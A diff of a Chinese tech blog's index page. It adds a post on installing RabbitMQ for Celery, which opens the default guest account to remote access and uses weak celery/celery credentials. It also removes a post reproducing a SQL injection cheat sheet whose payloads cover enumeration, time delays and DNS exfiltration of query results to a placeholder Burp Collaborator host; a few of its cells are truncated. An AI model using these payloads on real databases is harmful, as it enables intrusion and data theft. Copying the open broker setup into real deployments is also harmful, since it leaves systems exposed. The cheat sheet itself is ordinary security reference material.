@@ -252,6 +252,183 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/30/记录-RabbitMq-Install/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Foolisheddy">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Black House">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/06/30/记录-RabbitMq-Install/" itemprop="url">记录-RabbitMq-Install</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-06-30T14:36:34+08:00">
+                2019-06-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/Dev/" itemprop="url" rel="index">
+                    <span itemprop="name">Dev</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Pre"><a href="#Pre" class="headerlink" title="Pre:"></a>Pre:</h1><p><code>celery</code>+<code>redis</code> 经常会出现重复任务.</p>
+<p>所以打算用<code>rabbitmq</code>替换<code>redis</code>.</p>
+<hr>
+<h1 id="下载与安装"><a href="#下载与安装" class="headerlink" title="下载与安装:"></a>下载与安装:</h1><h2 id="erlang"><a href="#erlang" class="headerlink" title="erlang:"></a>erlang:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装erlang</span></span><br><span class="line">yum install erlang -y</span><br></pre></td></tr></table></figure>
+
+<h2 id="rabbitmq"><a href="#rabbitmq" class="headerlink" title="rabbitmq:"></a>rabbitmq:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装RabbitMQ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载rpm</span></span><br><span class="line">wget http://www.rabbitmq.com/releases/rabbitmq-server/v3.6.6/rabbitmq-server-3.6.6-1.el7.noarch.rpm</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装</span></span><br><span class="line">yum install rabbitmq-server-3.6.6-1.el7.noarch.rpm -y</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 完成后启动服务：</span></span><br><span class="line">service rabbitmq-server start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可以查看服务状态：</span></span><br><span class="line">service rabbitmq-server status</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 激活开机启动命令</span></span><br><span class="line">systemctl <span class="built_in">enable</span> rabbitmq-server.service</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="初始化配置"><a href="#初始化配置" class="headerlink" title="初始化配置:"></a>初始化配置:</h1><h2 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件:"></a>创建配置文件:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /etc/rabbitmq/</span><br><span class="line">vi rabbitmq.config</span><br><span class="line"><span class="comment"># 编辑内容如下：</span></span><br><span class="line">[&#123;rabbit, [&#123;loopback_users, []&#125;]&#125;].</span><br></pre></td></tr></table></figure>
+
+<p>这里的意思是开放使用，rabbitmq默认创建的用户<code>guest</code>，密码也是<code>guest</code>，这个用户默认只能是本机访问，localhost或者127.0.0.1，从外部访问需要添加上面的配置。</p>
+<h2 id="用户设置"><a href="#用户设置" class="headerlink" title="用户设置:"></a>用户设置:</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加用户</span></span><br><span class="line">rabbitmqctl add_user celery celery</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 添加虚拟主机</span></span><br><span class="line">rabbitmqctl add_vhost myvhost</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 赋予用户权限</span></span><br><span class="line">rabbitmqctl set_permissions -p myvhost celery <span class="string">".*"</span> <span class="string">".*"</span> <span class="string">".*"</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h1 id="修改celery配置文件"><a href="#修改celery配置文件" class="headerlink" title="修改celery配置文件:"></a>修改celery配置文件:</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CELERY_BROKER_URL = <span class="string">'amqp://celery:celery@your_ip:5672/myvhost'</span></span><br><span class="line">CELERY_RESULT_BACKEND = <span class="string">'amqp://celery:celery@your_ip:5672/myvhost'</span></span><br></pre></td></tr></table></figure>
+
+<p>修改配置文件后,就可以无缝接入<code>rabbitmq</code>,成功替换掉<code>redis</code>了.</p>
+<hr>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>只能说这个分布式队列的框架设计得特别好,把功能解耦开了,以至于在替换其中一个组件的时候,是如此的方便,无痛.</p>
+<p>好的程序设计思想:<strong>高内聚,低耦合</strong>永不过时.</p>
+<p>如果一开始贪快,没有设计好模块间的关系,初期可能感觉关系不大.</p>
+<p>但是到了后期要拓展,要debug的时候,才会发现把模块解耦的巨大好处.</p>
+<p>所以一开始的模块设计还是要花点心思的.多画画图,没什么坏处.</p>
+<hr>
+<h1 id="refs"><a href="#refs" class="headerlink" title="refs:"></a>refs:</h1><ul>
+<li><a href="https://www.cnblogs.com/uptothesky/p/6094357.html" target="_blank" rel="noopener">在CentOS7上安装RabbitMQ</a></li>
+<li><a href="https://blog.csdn.net/lanyang123456/article/details/77115868" target="_blank" rel="noopener">celery+Rabbit MQ的安装和使用</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/06/23/Notes-代码之外的功夫_程序员精进之路读后感/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1934,424 +2111,6 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/01/Sqli-SQL injection cheat sheet/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Foolisheddy">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="https://i.loli.net/2019/04/26/5cc1da1c90e1a.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Black House">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/05/01/Sqli-SQL injection cheat sheet/" itemprop="url">SQL injection cheat sheet</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-01T14:36:34+08:00">
-                2019-05-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/WebSecurity/" itemprop="url" rel="index">
-                    <span itemprop="name">WebSecurity</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>This SQL injection cheat sheet contains examples of useful syntax that you can use to perform a variety of tasks that often arise when performing SQL injection attacks.</p>
-<h1 id="String-concatenation-字符串连接"><a href="#String-concatenation-字符串连接" class="headerlink" title="String concatenation 字符串连接"></a>String concatenation 字符串连接</h1><p>You can concatenate together multiple strings to make a single string.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`’foo’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>&#39;foo&#39;+&#39;bar&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">`’foo’</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>&#39;foo&#39; &#39;bar&#39; [Note the space between the two strings]</code> <br> <code>CONCAT(&#39;foo&#39;,&#39;bar&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Comments-注释"><a href="#Comments-注释" class="headerlink" title="Comments 注释"></a>Comments 注释</h1><p>You can use comments to truncate a query and remove the portion of the original query that follows your input.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>--comment</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>--comment</code> <br> <code>/*comment*/</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>#comment</code> <br><code>-- comment [Note the space after the double dash]</code> <br><code>/*comment*/</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Database-version-数据库版本"><a href="#Database-version-数据库版本" class="headerlink" title="Database version 数据库版本"></a>Database version 数据库版本</h1><p>You can query the database to determine its type and version. This information is useful when formulating more complicated attacks.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT banner FROM v$version</code> <br><code>SELECT version FROM v$instance</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT @@version</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT version()</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT @@version</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Database-contents-数据库内容"><a href="#Database-contents-数据库内容" class="headerlink" title="Database contents 数据库内容"></a>Database contents 数据库内容</h1><p>You can list the tables that exist in the database, and the columns that those tables contain.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT * FROM all_tables</code> <br> <code>SELECT * FROM all_tab_columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code><br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT * FROM information_schema.tables</code> <br> <code>SELECT * FROM information_schema.columns WHERE table_name = &#39;TABLE-NAME-HERE&#39;</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Conditional-errors-条件错误"><a href="#Conditional-errors-条件错误" class="headerlink" title="Conditional errors 条件错误"></a>Conditional errors 条件错误</h1><p>You can test a single boolean condition and trigger a database error if the condition is true.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Batched-or-stacked-queries-批量查询"><a href="#Batched-or-stacked-queries-批量查询" class="headerlink" title="Batched (or stacked) queries 批量查询"></a>Batched (or stacked) queries 批量查询</h1><p>You can use batched queries to execute multiple queries in succession. Note that while the subsequent queries are executed, the results are not returned to the application. Hence this technique is primarily of use in relation to blind vulnerabilities where you can use a second query to trigger a DNS lookup, conditional error, or time delay.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>Does not support batched queries.</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>QUERY-1-HERE; QUERY-2-HERE</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>Does not support batched queries.</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Time-delays-时间延迟"><a href="#Time-delays-时间延迟" class="headerlink" title="Time delays 时间延迟"></a>Time delays 时间延迟</h1><p>You can cause a time delay in the database when the query is processed. The following will cause an unconditional time delay of 10 seconds.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left"><code>dbms_pipe.receive_message((&#39;a&#39;),10)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT pg_sleep(10)</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT sleep(10)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="Conditional-time-delays-有条件的时间延迟"><a href="#Conditional-time-delays-有条件的时间延迟" class="headerlink" title="Conditional time delays 有条件的时间延迟"></a>Conditional time delays 有条件的时间延迟</h1><p>You can test a single boolean condition and trigger a time delay if the condition is true.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN ‘a’</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY &#39;0:0:10&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left"><code>SELECT IF(YOUR-CONDITION-HERE,sleep(10),&#39;a&#39;)</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="DNS-lookup-DNS查询"><a href="#DNS-lookup-DNS查询" class="headerlink" title="DNS lookup DNS查询"></a>DNS lookup DNS查询</h1><p>You can cause the database to perform a DNS lookup to an external domain. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to confirm that a DNS lookup occurred.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">The following technique leverages an XML external entity (XXE) vulnerability to trigger a DNS lookup. The vulnerability has been patched but there are many unpatched Oracle installations in existence:<code>SELECT extractvalue(xmltype(&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM &quot;http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/&quot;&gt; %remote;]&gt;&#39;),&#39;/l&#39;) FROM dual</code><br><br>The following technique works on fully patched Oracle installations, but requires elevated privileges:<code>SELECT UTL_INADDR.get_host_address(&#39;YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;)</code></td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>exec master..xp_dirtree &#39;//YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&#39;</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left"><code>copy (SELECT &#39;&#39;) to program &#39;nslookup YOUR-SUBDOMAIN-HERE.burpcollaborator.net&#39;</code></td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left">The following techniques work on Windows only:<br><code>LOAD_FILE(&#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\\a&#39;)</code><br><code>SELECT ... INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找"><a href="#DNS-lookup-with-data-exfiltration-使用数据泄露进行DNS查找" class="headerlink" title="DNS lookup with data exfiltration 使用数据泄露进行DNS查找"></a>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</h1><p>You can cause the database to perform a DNS lookup to an external domain containing the results of an injected query. To do this, you will need to use Burp Collaborator client to generate a unique Burp Collaborator subdomain that you will use in your attack, and then poll the Collaborator server to retrieve details of any DNS interactions, including the exfiltrated data.</p>
-<table>
-<thead>
-<tr>
-<th align="left">database</th>
-<th align="left">example</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Oracle</td>
-<td align="left">`SELECT extractvalue(xmltype(‘<?xml version="1.0" encoding="UTF-8"?>&lt;!DOCTYPE root [ &lt;!ENTITY % remote SYSTEM “http://‘</td>
-</tr>
-<tr>
-<td align="left">Microsoft</td>
-<td align="left"><code>declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec(&#39;master..xp_dirtree &quot;//&#39;+@p+&#39;.YOUR-SUBDOMAIN-HERE.burpcollaborator.net/a&quot;&#39;)</code></td>
-</tr>
-<tr>
-<td align="left">PostgreSQL</td>
-<td align="left">create OR replace function f() returns void as $$<br>declare c text;<br>declare p text;<br>begin<br>SELECT into p (SELECT YOUR-QUERY-HERE);<br>c := ‘copy (SELECT ‘’’’) to program ‘’nslookup ‘</td>
-</tr>
-<tr>
-<td align="left">MySQL</td>
-<td align="left">The following technique works on Windows only:<code>SELECT YOUR-QUERY-HERE INTO OUTFILE &#39;\\\\YOUR-SUBDOMAIN-HERE.burpcollaborator.net\a&#39;</code></td>
-</tr>
-</tbody></table>
-<hr>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结:"></a>总结:</h1><p>SQL注入在不同数据库的表现,可表现在这些方面:</p>
-<ul>
-<li>String concatenation 字符串连接</li>
-<li>Comments 注释</li>
-<li>Database version 数据库版本的查询</li>
-<li>Database contents 数据库内容的查询</li>
-<li>Conditional errors 条件错误</li>
-<li>Batched (or stacked) queries 批量查询</li>
-<li>Time delays 时间延迟</li>
-<li>Conditional time delays 有条件的时间延迟</li>
-<li>DNS lookup DNS查询<br>DNS lookup with data exfiltration 使用数据泄露进行DNS查找</li>
-</ul>
-<hr>
-<h1 id="Refs"><a href="#Refs" class="headerlink" title="Refs:"></a>Refs:</h1><ul>
-<li><a href="https://portswigger.net/web-security/sql-injection/cheat-sheet" target="_blank" rel="noopener">SQL injection cheat sheet</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2404,7 +2163,7 @@ supervisor命令行的客户端名称是supervisorctl。它为supervisord提供�
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-count">54</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
